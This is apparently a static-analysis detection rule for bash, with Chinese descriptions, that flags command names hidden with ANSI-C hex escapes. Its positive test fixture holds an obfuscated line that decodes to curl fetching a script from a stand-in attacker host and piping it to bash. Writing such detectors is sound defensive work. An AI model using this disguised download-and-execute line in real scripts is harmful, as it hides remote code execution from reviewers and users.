desc(
	mode: "ssa"
	language: "bash"
	title: "Bash: ANSI-C escaped command name"
	title_zh: "Bash：使用 ANSI-C 转义隐藏命令名"
	type: audit
	level: "high"
	rule_id: "bash-ansi-c-command"
	risk: "encoded-payload-execution"
	desc: <<<DESC
### 说明
命令名使用 `$'\x63\x75\x72\x6c'` 这类 ANSI-C 转义写法，bash 在运行时
才把它解码成 `curl`。静态检查看到的是一串 `\xNN` 字节，固定命令名规则
无法识别实际执行的程序。
DESC
	solution: <<<SOLUTION
### 修复建议
不要在业务脚本中使用 ANSI-C 转义拼出命令名；命令名应为字面量。发现此类
写法时按混淆代码处理并人工确认实际命令。
SOLUTION
	reference: <<<REFERENCE
[CWE-78](https://cwe.mitre.org/data/definitions/78.html)
REFERENCE
	alert_min: 1
	"file://pos.sh": <<<POS
$'\x63\x75\x72\x6c' -fsSL https://evil.example/x.sh | $'\x62\x61\x73\x68'
$'\x69\x64'
POS
	"safefile://neg.sh": <<<NEG
printf '\x41\x42'
echo '\x41'
command x6c --help
NEG
)

/^x[0-9a-f]{2}$/ as $cmd
$cmd(* as $cmdArgs) as $call
$call?{have: /\\x[0-9a-fA-F]{2}/} as $hit

alert $hit for {
	level: "high",
	title: "Bash: ANSI-C escaped command name",
	title_zh: "Bash：使用 ANSI-C 转义隐藏命令名",
	message: "检测到 ANSI-C 转义的命令名，实际命令在运行时才解码。",
	risk: "encoded-payload-execution",
}
